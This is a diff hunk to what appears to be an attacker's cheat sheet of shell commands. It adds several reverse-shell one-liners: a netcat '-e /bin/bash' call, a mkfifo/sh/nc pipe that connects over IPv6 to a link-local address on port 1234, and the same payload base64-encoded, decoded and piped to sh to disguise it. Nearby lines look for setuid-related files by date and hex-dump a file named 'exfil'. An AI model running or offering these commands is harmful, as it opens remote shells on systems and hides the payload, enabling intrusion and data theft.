@@ -31,6 +31,11 @@ getacl /bin/su
 
 nc -h 2>&1;echo see the nc output
 
+nc -6 ip port -e /bin/bash 
+ 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -6 fe80::ba88:e3ff:fee9:e447%eth0 1234 >/tmp/f ' | sh  
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -6 fe80::ba88:e3ff:fee9:e447%eth0 1234 >/tmp/f ' | base64 -w0 | base64 -d | sh
+
 find / newermt 2018-05-15 ! -newermt 2018-05-19 -type f 2>/dev/null
 
 xxd -p -c 4 exfil
